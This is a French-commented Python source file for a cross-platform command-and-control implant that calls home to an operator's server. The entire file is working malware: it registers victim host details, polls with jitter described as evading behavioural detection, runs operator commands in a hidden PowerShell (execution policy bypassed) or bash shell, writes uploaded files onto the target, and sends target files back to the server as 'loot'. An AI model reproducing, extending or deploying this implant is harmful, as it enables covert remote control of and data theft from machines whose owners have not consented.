# ============================================================
#  agents/python/agent.py — Agent C2 professionnel
#
#  Rôle        : Implant Python cross-platform (Windows + Linux)
#  Shell       : PowerShell (Windows) / bash --norc (Linux)
#                → pas de prompt, pas d'echo, sortie propre
#  Dépend de   : requests, subprocess, platform, socket, os
# ============================================================

from typing import Optional, Dict, Any
import requests
import subprocess
import platform
import socket
import os
import re
import time
import random
import sys
import uuid
import base64
import threading
import queue


# ═══════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════

DEFAULT_SERVER    = "http://127.0.0.1:8000"
POLL_INTERVAL     = 3.0    # Intervalle de base (secondes)
JITTER            = 0.5    # ±50% de variation (Cobalt Strike style)
CMD_TIMEOUT       = 30     # Timeout exécution commande
HTTP_TIMEOUT      = 10     # Timeout requêtes HTTP
RECONNECT_DELAYS  = [3, 6, 12, 24, 60]  # Backoff exponentiel

IS_WINDOWS = platform.system() == "Windows"

# Fichier de persistance de l'agent_id
if IS_WINDOWS:
    _AGENT_ID_FILE = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), ".agent_id")
else:
    _AGENT_ID_FILE = "/tmp/.agent_id"

# Regex nettoyage sortie
_ANSI_RE = re.compile(r'\x1b(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')

# Patterns de prompt bash à supprimer (Kali, Ubuntu, Debian...)
_BASH_PROMPT_RE = re.compile(
    r'^(?:'
    r'[^\n]*?[㉿][^\n]*?\][\$#]\s*|'   # ┌──(kali㉿kali)-[path] puis └─$
    r'┌──[^\n]*|'                        # ligne top du prompt Kali
    r'└─[\$#]\s*|'                       # ligne bottom du prompt Kali
    r'\[[^\]]+@[^\]]+\s[^\]]+\][\$#]\s*|'  # [user@host dir]$
    r'[a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+:[^\$#\n]*[\$#]\s*|'  # user@host:path$
    r'bash-[\d.]+[\$#]\s*'               # bash-5.1$
    r')',
    re.MULTILINE
)

# Prompt PowerShell : "PS C:\path> "
_PS_PROMPT_RE = re.compile(r'^PS\s+[A-Z]:[^\n]*?>\s*', re.MULTILINE | re.IGNORECASE)


# ═══════════════════════════════════════════════════════════
# UTILITAIRES
# ═══════════════════════════════════════════════════════════

def get_server_url() -> str:
    """Récupère l'URL serveur depuis les arguments ou la valeur par défaut."""
    for i, arg in enumerate(sys.argv[1:], 1):
        if arg == "--server" and i < len(sys.argv):
            return sys.argv[i + 1].rstrip("/")
    return DEFAULT_SERVER


def get_jittered_interval() -> float:
    """
    Calcule un intervalle de polling avec jitter aléatoire.
    Rend le trafic réseau irrégulier pour éviter la détection comportementale.
    """
    return random.uniform(POLL_INTERVAL * (1 - JITTER), POLL_INTERVAL * (1 + JITTER))


def get_system_info() -> dict:
    """Collecte les informations système de la machine cible."""
    return {
        "hostname": socket.gethostname(),
        "username": os.getenv("USERNAME") or os.getenv("USER") or "unknown",
        "os":       f"{platform.system()} {platform.release()}"
    }


def decode_bytes(raw: bytes) -> str:
    """
    Décode un flux d'octets avec fallback multi-encodage.
    Gère les pages de code Windows (cp850, cp1252) et Linux (utf-8).
    """
    for enc in ('utf-8', 'cp850', 'cp1252', 'latin-1'):
        try:
            return raw.decode(enc)
        except (UnicodeDecodeError, AttributeError):
            continue
    return raw.decode('utf-8', errors='replace')


def clean_output(text: str, shell_type: str, sentinel: str) -> str:
    """
    Nettoie la sortie brute du shell persistant :
      1. Supprime les codes ANSI (couleurs, positionnement curseur)
      2. Supprime les lignes de prompt (PS1 bash, prompt PowerShell)
      3. Supprime toute ligne contenant le sentinel (sécurité)
      4. Trim whitespace global
    """
    # 1. Codes ANSI
    text = _ANSI_RE.sub('', text)

    # 2. Prompts selon le type de shell
    if shell_type == 'bash':
        lines = text.splitlines()
        cleaned = []
        for line in lines:
            s = line.rstrip('\r')
            # Supprime les lignes qui ressemblent à un prompt bash
            if _BASH_PROMPT_RE.match(s):
                continue
            cleaned.append(s)
        text = '\n'.join(cleaned)
    elif shell_type == 'powershell':
        text = _PS_PROMPT_RE.sub('', text)

    # 3. Supprime TOUTE ligne contenant un sentinel C2 (courant ou résidu d'init)
    safe_sentinel = re.escape(sentinel)
    text = re.sub(r'^.*' + safe_sentinel + r'.*$', '', text, flags=re.MULTILINE)
    # Filet de sécurité : supprime tout pattern __C2_...__  résiduel
    text = re.sub(r'^.*__C2_[A-Z_]+(?:_[0-9a-f]+)?__.*$', '', text, flags=re.MULTILINE)

    # 4. Normalise les lignes vides multiples → une seule
    text = re.sub(r'\n{3,}', '\n\n', text)

    return text.strip()


# ═══════════════════════════════════════════════════════════
# CLASSE PERSISTENT SHELL
# ═══════════════════════════════════════════════════════════

class PersistentShell:
    """
    Shell persistant cross-platform qui maintient l'état entre les commandes
    (répertoire courant, variables d'environnement, etc.).

    Windows : powershell.exe -NoLogo -NoProfile -NonInteractive -Command -
              → -Command - lit stdin sans afficher de prompt ni d'echo
              → supporte ls, pwd, cat, grep nativement (aliases PowerShell)

    Linux   : /bin/bash --norc --noprofile  avec PS1='' PS2='' TERM=dumb
              → pas de chargement de .bashrc (pas de prompt Kali fancy)
              → pas d'echo, pas de PS1 dans la sortie

    Architecture reader thread :
      Un seul thread lit TOUT stdout en continu → queue partagée.
      _readline_timeout() consomme uniquement depuis la queue.
      Élimine les race conditions entre threads concurrents.
    """

    def __init__(self):
        self.process    = None
        self.lock       = threading.Lock()
        self.is_started = False
        self.shell_type = None          # 'powershell' | 'bash'
        self._stdout_q  = queue.Queue() # Queue partagée pour tout stdout
        self._reader_th = None          # Thread lecteur unique

    # ── Reader thread unique ───────────────────────────────

    def _start_reader(self):
        """
        Démarre UN SEUL thread qui lit TOUT stdout en continu.
        Chaque ligne est mise dans self._stdout_q.
        Évite les race conditions entre appels _readline_timeout concurrents.
        """
        def _reader():
            try:
                while True:
                    line = self.process.stdout.readline()
                    if not line:
                        break
                    self._stdout_q.put(line)
            except Exception:
                pass
        self._reader_th = threading.Thread(target=_reader, daemon=True)
        self._reader_th.start()

    def _clear_queue(self):
        """Vide la queue partagée (appelé avant redémarrage du shell)."""
        while not self._stdout_q.empty():
            try:
                self._stdout_q.get_nowait()
            except queue.Empty:
                break

    # ── Démarrage ─────────────────────────────────────────

    def start(self) -> bool:
        """Démarre le shell persistant adapté à la plateforme."""
        if self.is_started and self.is_alive():
            return True

        try:
            env = os.environ.copy()

            if IS_WINDOWS:
                cmd = [
                    "powershell.exe",
                    "-NoLogo",
                    "-NoProfile",
                    "-NonInteractive",
                    "-ExecutionPolicy", "Bypass",
                    "-Command", "-",   # Lit stdin sans afficher de prompt ni echo
                ]
                self.shell_type = 'powershell'
            else:
                # bash non-interactif sans .bashrc, sans PS1
                env['PS1']  = ''
                env['PS2']  = ''
                env['TERM'] = 'dumb'
                cmd = ["/bin/bash", "--norc", "--noprofile"]
                self.shell_type = 'bash'

            self._clear_queue()

            self.process = subprocess.Popen(
                cmd,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=False,
                bufsize=0,
                env=env
            )
            self.is_started = True

            # Démarre le reader thread unique AVANT le drain
            self._start_reader()

            # Vide la bannière de démarrage éventuelle (PowerShell)
            self._drain_startup()
            return True

        except Exception as e:
            print(f"[!] Erreur démarrage shell: {e}")
            return False

    def _drain_startup(self):
        """
        Vide le buffer de sortie initial du shell après son démarrage.
        Évite que la bannière PowerShell ne pollue le premier résultat.
        """
        sentinel = "__C2_INIT_READY__"
        cmd = self._build_sentinel_cmd(sentinel)
        try:
            self.process.stdin.write(cmd.encode('utf-8'))
            self.process.stdin.flush()
            # Lit jusqu'au sentinel avec timeout de 8 secondes
            deadline = time.time() + 8
            while time.time() < deadline:
                line = self._readline_timeout(1.0)
                if line and sentinel in line:
                    break
        except Exception:
            pass

    # ── Lifecycle ─────────────────────────────────────────

    def is_alive(self) -> bool:
        """Vérifie si le processus shell est toujours actif."""
        return bool(self.process) and self.process.poll() is None

    def restart(self) -> bool:
        """Arrête proprement et redémarre le shell."""
        if self.process:
            try:
                self.process.terminate()
                self.process.wait(timeout=3)
            except Exception:
                try:
                    self.process.kill()
                except Exception:
                    pass
        self.is_started = False
        self.process    = None
        self._clear_queue()
        return self.start()

    # ── Lecture avec timeout ──────────────────────────────

    def _readline_timeout(self, timeout: float) -> Optional[str]:
        """
        Lit une ligne depuis la queue partagée avec timeout.
        Aucun thread créé ici — le reader thread unique alimente la queue.
        Retourne None si timeout atteint.
        """
        try:
            raw = self._stdout_q.get(timeout=timeout)
            return decode_bytes(raw) if raw else None
        except queue.Empty:
            return None

    # ── Construction des commandes ─────────────────────────

    def _build_sentinel_cmd(self, sentinel: str) -> str:
        """
        Construit la commande d'impression du sentinel selon le shell.
        PowerShell : Write-Host (pas de pipeline, toujours affiché)
        bash       : printf (plus fiable que echo sur tous les systèmes)
        """
        if self.shell_type == 'powershell':
            return f"Write-Host '{sentinel}'\n"
        else:
            return f"printf '%s\\n' '{sentinel}'\n"

    # ── Exécution ─────────────────────────────────────────

    def run(self, command: str, task_id: str, timeout: int = CMD_TIMEOUT) -> tuple:
        """
        Exécute une commande dans le shell persistant et retourne (output, status).

        Mécanisme sentinel :
          1. Envoie la commande dans stdin
          2. Envoie immédiatement un marqueur unique (sentinel)
          3. Lit stdout jusqu'à trouver le sentinel → fin de commande garantie
          4. Nettoie la sortie (ANSI, prompts, sentinel lui-même)
        """
        if not self.is_alive():
            if not self.restart():
                return "[ERREUR] Shell indisponible", "error"

        with self.lock:
            sentinel = f"__C2_DONE_{task_id}__"
            try:
                # Envoie commande + sentinel dans stdin
                payload = command + "\n" + self._build_sentinel_cmd(sentinel)
                self.process.stdin.write(payload.encode('utf-8', errors='replace'))
                self.process.stdin.flush()

                # Collecte les lignes jusqu'au sentinel
                raw_lines = []
                deadline  = time.time() + timeout
                found     = False

                while time.time() < deadline:
                    line = self._readline_timeout(timeout=min(1.0, deadline - time.time()))
                    if line is None:
                        if not self.is_alive():
                            # Shell mort pendant l'exécution
                            self.restart()
                            return "[ERREUR] Shell interrompu pendant l'exécution", "error"
                        continue  # timeout lecture partielle, continue

                    if sentinel in line:
                        found = True
                        break

                    raw_lines.append(line)

                if not found:
                    return f"[TIMEOUT] Commande interrompue après {timeout}s", "timeout"

                raw_output = ''.join(raw_lines)
                output     = clean_output(raw_output, self.shell_type, sentinel)
                return output if output else "(pas de sortie)", "success"

            except Exception as e:
                if not self.is_alive():
                    self.restart()
                return f"[ERREUR] {e}", "error"


# ═══════════════════════════════════════════════════════════
# CLASSE AGENT
# ═══════════════════════════════════════════════════════════

class C2Agent:
    """
    Agent C2 professionnel :
      - Shell persistant PowerShell / bash (sortie propre)
      - Persistance agent_id dans fichier local (.agent_id)
      - Reconnexion automatique avec backoff exponentiel
      - Jitter sur le polling (trafic irrégulier)
      - Modules : shell, upload, download, sysinfo
    """

    def __init__(self, server_url: str):
        self.server_url         = server_url
        self.agent_id: Optional[str] = None
        self.session            = requests.Session()
        self.reconnect_attempts = 0
        self.running            = True
        self.shell              = PersistentShell()

    # ── HTTP ──────────────────────────────────────────────

    def _request(self, method: str, endpoint: str, **kwargs) -> Optional[requests.Response]:
        """
        Effectue une requête HTTP GET ou POST avec gestion silencieuse des erreurs.
        Retourne None en cas d'échec réseau (pas d'exception levée).
        """
        url = f"{self.server_url}{endpoint}"
        try:
            fn = self.session.get if method == "GET" else self.session.post
            resp = fn(url, timeout=HTTP_TIMEOUT, **kwargs)
            self.reconnect_attempts = 0
            return resp
        except Exception:
            return None

    def _backoff_delay(self) -> int:
        """Retourne le délai de reconnexion en secondes selon le nombre de tentatives."""
        idx = min(self.reconnect_attempts, len(RECONNECT_DELAYS) - 1)
        self.reconnect_attempts += 1
        return RECONNECT_DELAYS[idx]

    # ── Persistance agent_id ──────────────────────────────

    def _load_id(self) -> Optional[str]:
        """
        Charge l'agent_id depuis le fichier .agent_id local.
        Permet la réidentification transparente après redémarrage.
        """
        try:
            if os.path.exists(_AGENT_ID_FILE):
                saved = open(_AGENT_ID_FILE).read().strip()
                if len(saved) == 8:
                    return saved
        except Exception:
            pass
        return None

    def _save_id(self, agent_id: str):
        """Sauvegarde l'agent_id sur disque pour les prochains démarrages."""
        try:
            with open(_AGENT_ID_FILE, "w") as f:
                f.write(agent_id)
        except Exception:
            pass

    # ── Enregistrement ────────────────────────────────────

    def register(self) -> bool:
        """
        Enregistre l'agent sur le serveur C2 avec résolution d'identité en 3 niveaux :
          1. Envoie l'agent_id sauvegardé si disponible → réutilisation directe
          2. Sinon le serveur cherche par empreinte machine (hostname+username+os)
          3. Sinon création d'un nouvel agent_id

        Retry infini avec backoff exponentiel jusqu'à connexion réussie.
        """
        saved_id = self._load_id()

        while self.running:
            info = get_system_info()
            if saved_id:
                info["agent_id"] = saved_id

            resp = self._request("POST", "/agent/register", json=info)
            if resp and resp.status_code == 200:
                data           = resp.json()
                self.agent_id  = data["agent_id"]
                self._save_id(self.agent_id)

                action = "Reconnecté" if data.get("message") == "Reconnexion" else "Enregistré"
                print(f"[+] {action} — ID: {self.agent_id}")

                if not self.shell.start():
                    print("[!] Impossible de démarrer le shell")
                    return False
                return True

            delay = self._backoff_delay()
            print(f"[!] Serveur inaccessible — retry dans {delay}s")
            time.sleep(delay)

        return False

    # ── Polling ───────────────────────────────────────────

    def poll(self) -> Optional[Dict[str, Any]]:
        """
        Interroge le serveur pour une tâche disponible (heartbeat simultané).
        Retourne None si pas de tâche ou erreur réseau.
        Retourne None et réinitialise agent_id si 404 (serveur redémarré).
        """
        if not self.agent_id:
            return None

        resp = self._request("GET", f"/agent/{self.agent_id}/poll")
        if not resp:
            return None

        if resp.status_code == 404:
            self.agent_id = None   # force réenregistrement
            return None

        if resp.status_code == 200:
            data = resp.json()
            if data.get("has_task"):
                return {
                    "task_id":   data["task_id"],
                    "command":   data["command"],
                    "module":    data.get("module", "shell"),
                    "file_data": data.get("file_data", ""),
                }
        return None

    # ── Envoi résultat ────────────────────────────────────

    def send_result(self, task_id: str, output: str, status: str) -> bool:
        """Envoie le résultat d'une tâche exécutée au serveur C2."""
        if not self.agent_id:
            return False
        resp = self._request("POST", "/agent/result", json={
            "task_id":  task_id,
            "agent_id": self.agent_id,
            "output":   output,
            "status":   status,
        })
        return bool(resp and resp.status_code == 200)

    # ── Exécution des modules ─────────────────────────────

    def execute(self, task: Dict[str, Any]) -> tuple:
        """
        Dispatch une tâche vers le module approprié.
        Modules supportés : shell, upload, download, sysinfo
        """
        command   = task.get("command", "")
        module    = task.get("module", "shell")
        file_data = task.get("file_data", "")

        if module == "shell":
            return self._shell(command)
        elif module == "upload":
            return self._upload(command, file_data)
        elif module == "download":
            return self._download(command)
        elif module == "sysinfo":
            return self._sysinfo()
        else:
            return f"[ERREUR] Module inconnu: {module}", "error"

    def _shell(self, command: str) -> tuple:
        """
        Exécute une commande via le shell persistant.
        Le task_id local sert uniquement de sentinel unique — différent du task_id serveur.
        """
        local_id = uuid.uuid4().hex[:8]
        return self.shell.run(command, local_id, CMD_TIMEOUT)

    def _upload(self, command: str, file_data_b64: str) -> tuple:
        """
        Reçoit un fichier de l'opérateur (base64) et l'écrit sur la cible.
        Supporte les fichiers binaires et texte.
        Syntaxe commande : upload <chemin_destination>
        """
        parts = command.split(None, 1)
        if len(parts) < 2:
            return "[ERREUR] Usage: upload <chemin_destination>", "error"

        dest = parts[1].strip()

        try:
            raw = base64.b64decode(file_data_b64)
        except Exception as e:
            return f"[ERREUR] Décodage base64: {e}", "error"

        size = len(raw)
        if size > 50 * 1024 * 1024:
            return f"[ERREUR] Fichier trop volumineux ({size} bytes, max 50MB)", "error"

        try:
            parent = os.path.dirname(dest)
            if parent:
                os.makedirs(parent, exist_ok=True)
            with open(dest, 'wb') as f:
                f.write(raw)
            return f"[OK] Fichier écrit : {dest} ({size:,} bytes)", "success"
        except Exception as e:
            return f"[ERREUR] Écriture fichier: {e}", "error"

    def _download(self, command: str) -> tuple:
        """
        Lit un fichier sur la cible et le renvoie encodé en base64.
        Syntaxe commande : download <chemin_fichier> [chemin_local]
        Le serveur décode le base64 et sauvegarde dans server/loot/.
        """
        parts = command.split()
        if len(parts) < 2:
            return "[ERREUR] Usage: download <chemin_fichier>", "error"

        path = parts[1]

        if not os.path.isfile(path):
            return f"[ERREUR] Fichier introuvable: {path}", "error"

        try:
            with open(path, 'rb') as f:
                raw = f.read()
            return base64.b64encode(raw).decode('ascii'), "success"
        except Exception as e:
            return f"[ERREUR] Lecture fichier: {e}", "error"

    def _sysinfo(self) -> tuple:
        """
        Retourne un rapport système détaillé sans exécuter de commande shell.
        Données : OS, hostname, user, CPU, mémoire, disque, IP, PID courant.
        """
        try:
            import socket as _sock
            lines = [
                f"Hostname   : {_sock.gethostname()}",
                f"OS         : {platform.system()} {platform.release()} {platform.version()}",
                f"Machine    : {platform.machine()}",
                f"Username   : {os.getenv('USERNAME') or os.getenv('USER') or 'unknown'}",
                f"PID        : {os.getpid()}",
                f"CWD        : {os.getcwd()}",
            ]
            # IP locale
            try:
                s = _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                lines.append(f"IP locale  : {s.getsockname()[0]}")
                s.close()
            except Exception:
                pass

            # Python runtime
            lines.append(f"Python     : {sys.version.split()[0]}")
            lines.append(f"Arch       : {platform.architecture()[0]}")

            return "\n".join(lines), "success"
        except Exception as e:
            return f"[ERREUR] sysinfo: {e}", "error"

    # ── Boucle principale ─────────────────────────────────

    def run(self):
        """
        Boucle principale de l'agent :
          1. Enregistrement (avec persistance d'ID)
          2. Polling toutes les ~3s ± jitter
          3. Exécution des tâches reçues
          4. Réenregistrement automatique si serveur redémarre
        """
        print(f"[*] Agent C2 — {platform.system()} — {self.server_url}")

        while self.running:
            if not self.agent_id:
                if not self.register():
                    break

            while self.running and self.agent_id:
                try:
                    task = self.poll()

                    if task:
                        tid = task["task_id"]
                        print(f"[>] Task {tid} | {task['module']} | {task['command'][:60]}")

                        output, status = self.execute(task)

                        if self.send_result(tid, output, status):
                            print(f"[+] Résultat envoyé [{status}]")
                        else:
                            print(f"[!] Échec envoi résultat")

                    time.sleep(get_jittered_interval())

                except KeyboardInterrupt:
                    print("\n[!] Arrêt")
                    self.running = False
                    break
                except Exception as e:
                    print(f"[!] Erreur boucle: {e}")
                    time.sleep(POLL_INTERVAL)

            if self.running and not self.agent_id:
                print("[!] Réenregistrement nécessaire...")


# ═══════════════════════════════════════════════════════════
# POINT D'ENTRÉE
# ═══════════════════════════════════════════════════════════

if __name__ == "__main__":
    C2Agent(get_server_url()).run()
